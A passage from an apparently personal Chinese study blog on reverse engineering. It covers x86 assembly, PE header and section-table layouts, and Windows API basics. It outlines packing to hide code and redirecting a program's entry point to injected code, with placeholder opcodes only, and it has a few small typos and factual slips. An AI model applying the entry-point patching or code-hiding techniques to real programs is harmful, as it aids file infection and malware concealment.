class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">edx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>], <span class="built_in">edx</span>      <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">JMP</span> Start</span><br><span class="line"><span class="comment">; End</span></span><br></pre></td></tr></table></figure>

<p>For 语句</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; 取传入的参数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>], <span class="built_in">eax</span>      <span class="comment">; 放入局部变量</span></span><br><span class="line"><span class="keyword">JMP</span> Middle                        <span class="comment">; 跳转到</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ecx</span>, <span class="number">1</span>                        <span class="comment">; i++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>], <span class="built_in">ecx</span>      <span class="comment">; i++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; Middle</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]   </span><br><span class="line"><span class="keyword">JGE</span> End                           <span class="comment">; 与传入的另一参数判断大小</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; 传入参数，调用Printf</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                       <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                        <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">JMP</span> Start</span><br><span class="line"><span class="comment">; End</span></span><br></pre></td></tr></table></figure>

<h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>32位机下，指针不论指向何种类型，都是32位4字节。<br>64位机下，指针不论指向何种类型，都是64位8字节。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; int x = *px;</span></span><br><span class="line"><span class="comment">; 寄存器间接寻址 </span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - 0xCh], <span class="built_in">edx</span></span><br></pre></td></tr></table></figure>

<h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>将需要保护的代码的硬编码放到数据区，并将代码区变为全零。<br>可以用位运算对代码加密，例如对执行代码取反后保存。<br>用一个进程执行另一个程序的代码，隐藏原程序。</p>
<h3 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h3><p>Windows程序在内存或硬盘中结构一般有这几部分：</p>
<ul>
<li>DOS 头</li>
<li>填充数据（无用，长度可变）</li>
<li>NT 头（标准PE头，可选PE头）</li>
<li>节表（各个节的位置）</li>
<li>节 x N （数据段，代码段等）</li>
</ul>
<p>程序在硬盘中和在运行时的二进制数据不一样。区别：</p>
<ol>
<li>地址起始位置：硬盘中从0开始，内存中不是。</li>
<li>对齐方式：早期程序，在硬盘中对齐单位是200h。现代程序对齐单位一般是1000h。内存中对齐一般是1000h。</li>
</ol>
<p>DOS 头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被注释的部分是16位程序使用的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0X00</span> WORD e_magic;      <span class="comment">//※Magic DOS signature MZ(4Dh 5Ah):MZ标记:用于标记是否是可执行文件</span></span><br><span class="line">    <span class="comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span></span><br><span class="line">    <span class="comment">//0X04 WORD e_cp;       //Pages in file</span></span><br><span class="line">    <span class="comment">//0X06 WORD e_crlc;     //Relocations</span></span><br><span class="line">    <span class="comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span></span><br><span class="line">    <span class="comment">//0X0A WORD e_minalloc; //Minimun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0E WORD e_ss;       //intial(relative)SS value</span></span><br><span class="line">    <span class="comment">//0X10 WORD e_sp;       //intial SP value</span></span><br><span class="line">    <span class="comment">//0X12 WORD e_csum;     //Checksum</span></span><br><span class="line">    <span class="comment">//0X14 WORD e_ip;       //intial IP value</span></span><br><span class="line">    <span class="comment">//0X16 WORD e_cs;       //intial(relative)CS value</span></span><br><span class="line">    <span class="comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span></span><br><span class="line">    <span class="comment">//0X1A WORD e_ovno;     //Overlay number</span></span><br><span class="line">    <span class="comment">//0x1C WORD e_res[4];   //Reserved words</span></span><br><span class="line">    <span class="comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span></span><br><span class="line">    <span class="comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span></span><br><span class="line">    <span class="comment">//0x28 WORD e_res2[10]; //Reserved words</span></span><br><span class="line">    <span class="number">0x3C</span> DWORD e_lfanew;    <span class="comment">//※Offset to start of PE header:定位PE文件，PE头相对于文件的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>NT 头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NT 头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> DWORD Signature;   <span class="comment">//PE文件标识:ASCII的&quot;PE\0\0&quot;  50h 45h</span></span><br><span class="line">    <span class="number">0x04</span> _IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="number">0x18</span> _IMAGE_OPTIONAL_HEADER OptionalHeader;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>标准 PE 头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> WORD Machine;                  <span class="comment">//※程序执行的CPU平台:0X0:任何平台，0X14C:intel i386及后续处理器</span></span><br><span class="line">    <span class="number">0x02</span> WORD NumberOfSections;         <span class="comment">//※PE文件中区块数量</span></span><br><span class="line">    <span class="number">0x04</span> DWORD TimeDateStamp;           <span class="comment">//时间戳：连接器产生此文件的时间距1969/12/31-16:00P:00的总秒数</span></span><br><span class="line">    <span class="comment">//0x08 DWORD PointerToSymbolTable;  //COFF符号表格的偏移位置。此字段只对COFF除错信息有用</span></span><br><span class="line">    <span class="comment">//0x0c DWORD NumberOfSymbols;       //COFF符号表格中的符号个数。该值和上一个值在release版本的程序里为0</span></span><br><span class="line">    <span class="number">0x10</span> WORD SizeOfOptionalHeader;   <span class="comment">//IMAGE_OPTIONAL_HEADER结构的大小(字节数):32位默认E0H,64位默认F0H(可修改)</span></span><br><span class="line">    <span class="number">0x12</span> WORD Characteristics;          <span class="comment">//※描述文件属性,eg:</span></span><br><span class="line">                                        <span class="comment">//单属性(只有1bit为1)：#define IMAGE_FILE_DLL 0x2000  //File is a DLL.</span></span><br><span class="line">                                        <span class="comment">//组合属性(多个bit为1，单属性或运算):0X010F 可执行文件</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可选 PE 头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> WORD Magic;                    <span class="comment">//※幻数(魔数)，0x0107:ROM image,0x010B:32位PE，0X020B:64位PE </span></span><br><span class="line">    <span class="comment">//0x02 BYTE MajorLinkerVersion;     //连接器主版本号</span></span><br><span class="line">    <span class="comment">//0x03 BYTE MinorLinkerVersion;     //连接器副版本号</span></span><br><span class="line">    <span class="number">0x04</span> DWORD SizeOfCode;              <span class="comment">//所有代码段的总和大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x08</span> DWORD SizeOfInitializedData;   <span class="comment">//已经初始化数据的大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x0c</span> DWORD SizeOfUninitializedData; <span class="comment">//未经初始化数据的大小,注意：必须是FileAlignment的整数倍,存在但没用</span></span><br><span class="line">    <span class="number">0x10</span> DWORD AddressOfEntryPoint;     <span class="comment">//※程序入口地址OEP，这是一个RVA(Relative Virtual Address),通常会落在.textsection,此字段对于DLLs/EXEs都适用。</span></span><br><span class="line">    <span class="number">0x14</span> DWORD BaseOfCode;              <span class="comment">//代码段起始地址(代码基址),(代码的开始和程序无必然联系)</span></span><br><span class="line">    <span class="number">0x18</span> DWORD BaseOfData;              <span class="comment">//数据段起始地址(数据基址)</span></span><br><span class="line">    <span class="number">0x1c</span> DWORD ImageBase;               <span class="comment">//※内存镜像基址(默认装入起始地址),默认为4000H</span></span><br><span class="line">    <span class="number">0x20</span> DWORD SectionAlignment;        <span class="comment">//※内存对齐:一旦映像到内存中，每一个section保证从一个「此值之倍数」的虚拟地址开始</span></span><br><span class="line">    <span class="number">0x24</span> DWORD FileAlignment;           <span class="comment">//※文件对齐：最初是200H，现在是1000H</span></span><br><span class="line">    <span class="comment">//0x28 WORD MajorOperatingSystemVersion;    //所需操作系统主版本号</span></span><br><span class="line">    <span class="comment">//0x2a WORD MinorOperatingSystemVersion;    //所需操作系统副版本号</span></span><br><span class="line">    <span class="comment">//0x2c WORD MajorImageVersion;              //自定义主版本号,使用连接器的参数设置,eg:LINK /VERSION:2.0 myobj.obj</span></span><br><span class="line">    <span class="comment">//0x2e WORD MinorImageVersion;              //自定义副版本号,使用连接器的参数设置</span></span><br><span class="line">    <span class="comment">//0x30 WORD MajorSubsystemVersion;          //所需子系统主版本号,典型数值4.0(Windows 4.0/即Windows 95)</span></span><br><span class="line">    <span class="comment">//0x32 WORD MinorSubsystemVersion;          //所需子系统副版本号</span></span><br><span class="line">    <span class="comment">//0x34 DWORD Win32VersionValue;             //总是0</span></span><br><span class="line">    <span class="number">0x38</span> DWORD SizeOfImage;         <span class="comment">//※PE文件在内存中映像总大小,sizeof(ImageBuffer),SectionAlignment的倍数</span></span><br><span class="line">    <span class="number">0x3c</span> DWORD SizeOfHeaders;       <span class="comment">//※DOS头(64B)+PE标记(4B)+标准PE头(20B)+可选PE头+节表的总大小，按照文件对齐(FileAlignment的倍数)</span></span><br><span class="line">    <span class="number">0x40</span> DWORD CheckSum;            <span class="comment">//PE文件CRC校验和，判断文件是否被修改</span></span><br><span class="line">    <span class="comment">//0x44 WORD Subsystem;          //用户界面使用的子系统类型</span></span><br><span class="line">    <span class="comment">//0x46 WORD DllCharacteristics;   //总是0</span></span><br><span class="line">    <span class="number">0x48</span> DWORD SizeOfStackReserve;  <span class="comment">//默认线程初始化栈的保留大小</span></span><br><span class="line">    <span class="number">0x4c</span> DWORD SizeOfStackCommit;   <span class="comment">//初始化时实际提交的线程栈大小</span></span><br><span class="line">    <span class="number">0x50</span> DWORD SizeOfHeapReserve;   <span class="comment">//默认保留给初始化的process heap的虚拟内存大小</span></span><br><span class="line">    <span class="number">0x54</span> DWORD SizeOfHeapCommit;    <span class="comment">//初始化时实际提交的process heap大小</span></span><br><span class="line">    <span class="comment">//0x58 DWORD LoaderFlags;       //总是0</span></span><br><span class="line">    <span class="number">0x5c</span> DWORD NumberOfRvaAndSizes; <span class="comment">//目录项数目：总为0X00000010H(16)</span></span><br><span class="line">    <span class="number">0x60</span> _IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>DataDictionary:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span>&#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//占用16*8 = 128Byte = 80H = E0H(可选PE头默认大小) - 60H(前面所有成员固定占用大小)</span></span><br></pre></td></tr></table></figure>

<p>节表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span>&#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 8个字节的节区名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Misc</span>&#123;</span></span><br><span class="line">        DWORD PhysicalAddress;       </span><br><span class="line">        DWORD VirtualSize;            <span class="comment">//节区的尺寸</span></span><br><span class="line">    &#125;</span><br><span class="line">    DWORD VirtualAddress;         <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">    DWORD SizeOfRawData;            <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;        <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">    DWORD PointerToRelocations;     <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;   <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">    WORD NumberOfRelocations;      <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;    <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;       <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h3 id="空白区加代码"><a href="#空白区加代码" class="headerlink" title="空白区加代码"></a>空白区加代码</h3><ol>
<li>找到 MessageBoxA 函数。</li>
<li>在可选PE头中找到OEP，修改。</li>
<li>采用硬编码编写。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="comment">; 调用参数     ; 6A 00</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="comment">; OEP 指向这里 ; E8 XX XX XX XX</span></span><br><span class="line"><span class="keyword">JMP</span>  <span class="comment">; OEP 原来的值 ; E9 XX XX XX XX 这个X的值是 要跳转的地址与此条指令的下一条指令地址之间的差</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>当要修改节的内容或新增节时（都是修改拉伸后的内容）：</p>
<ol>
<li>分配空间。（SizeOfImage）</li>
<li>复制头部：DOS, PE, Option PE, 节表。（SizeOfHeaders）</li>
<li>确定每一节的大小。（VirtualSize，SizeOfRawData，SizeOfImage）</li>
<li>确定节的位置。（PointToRawData，VirtualAddress）</li>
<li>修改代码时注意偏移。（ImageBase）</li>
<li>新加入一节，需要在节表中新增条目，修改PE头中节数量，以及SizeOfImage。</li>
<li>节表新加入节条目后，后面需要补一个全零的条目。（40个字节）</li>
<li>当扩大最后一节时，需要修改SizeOfRawData，VirtualSize，SizeOfImage。</li>
<li>当合并节时，需要修改节表。（SizeOfHeaders，SizeOfRawData，VirtualSize，PointToRawData）</li>
</ol>
<p>注意：</p>
<ol>
<li>SizeOfHeaders不可以随便变，一旦改变，下面所有的地址都需要变。</li>
<li>如果节表空间不够，则将NT头网上移动，占据DOS STUB空间。</li>
<li>一旦节表空间不足，DOS STUB空间不足等情况发生，则扩大最后一个节添加数据。</li>
<li>有时节表的后面不一定是空闲空间，也可能是有用数据，就不增加节，而是直接修改现有节。</li>
</ol>
<h3 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h3><p>记录了16种不同的信息：<strong>导出表</strong>，<strong>导入表</strong>，资源表，异常信息表，安全证书表，<strong>重定位表</strong>，调试信息表，版权所有表，全局指针表，TLS表，加载配置表，绑定导入表，<strong>IAT表</strong>，延迟导入表，COM信息表，未使用（作为保留）。</p>
<p>Data Dictionary:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span>&#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//占用16*8 = 128Byte = 80H = E0H(可选PE头默认大小) - 60H(前面所有成员固定占用大小)</span></span><br></pre></td></tr></table></figure>

<h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h3 id="IAT表"><a href="#IAT表" class="headerlink" title="IAT表"></a>IAT表</h3><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><p>IN OUT </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只是用来标记，没有任何作用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUT</span></span><br></pre></td></tr></table></figure>

<p>LPVOID：等于<code>void *</code></p>
<p>LPSTR：字符串</p>
<p>FILE：文件</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LPSTR file_name = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">FILE file = fopen(file_name, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">DWORD file_size = ftell(file);</span><br><span class="line"><span class="comment">// 指针回归头部</span></span><br><span class="line">fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"><span class="comment">// 读取文件数据</span></span><br><span class="line"><span class="type">size_t</span> n = fread(buffer, file_size, <span class="number">1</span>, file);</span><br><span class="line"><span class="comment">// 关闭文件</span></span><br><span class="line">fclose(file);</span><br></pre></td></tr></table></figure>


<h1 id="Windows-API-1"><a href="#Windows-API-1" class="headerlink" title="Windows API"></a>Windows API</h1><p>参考：《Windows 黑客编程技术详解》  甘迪文。<a target="_blank" rel="noopener" href="https://www.write-bug.com/">Write Bug 社区</a></p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行单一实例</span></span><br><span class="line"><span class="comment">//   创建一个互斥对象 </span></span><br><span class="line">CreateMutex</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 延迟加载</span></span><br><span class="line"><span class="comment">// DLL 延迟加载信息存储在 ImgDelayDesrc 延迟导入表中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源插入</span></span><br><span class="line"><span class="comment">// MFC 中，解决方案 -&gt; 资源 -&gt; 添加资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源释放</span></span><br><span class="line"><span class="comment">//   确定模块中某类型和名称的资源所在位置，返回资源句柄</span></span><br><span class="line"><span class="built_in">FindResource</span>()</span><br><span class="line"><span class="comment">//   获取资源字节数，依据句柄获取字节数</span></span><br><span class="line"><span class="built_in">SizeofResource</span>()</span><br><span class="line"><span class="comment">//   装载资源到内存，返回资源数据的句柄</span></span><br><span class="line"><span class="built_in">LoadResource</span>()</span><br><span class="line"><span class="comment">//   锁定资源数据，返回资源第一个字节的指针</span></span><br><span class="line"><span class="built_in">LockResource</span>()</span><br><span class="line"><span class="comment">//   最后可以将数据保存到文件</span></span><br><span class="line"><span class="comment">//   资源通常存放在 PE 中 IMAGE_RESOURCE_DIRECTORY</span></span><br></pre></td></tr></table></figure>

<h3 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h3><h1 id="Windows-内核"><a href="#Windows-内核" class="headerlink" title="Windows 内核"></a>Windows 内核</h1>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Kali/" rel="tag"># Kali</a>
              <a href="/tags/%E6%B1%87%E7%BC%96/" rel="tag"># 汇编</a>
              <a href="/tags/%E9%80%86%E5%90%91/" rel="tag"># 逆向</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/09/13/C/STL/" rel="prev" title="C++ STL">
                  <i class="fa fa-angle-left"></i> C++ STL
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/11/26/%E8%BF%90%E7%BB%B4/Nginx/" rel="next" title="Nginx">
                  Nginx <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Peng</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  

  <a href="https://github.com/withz" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

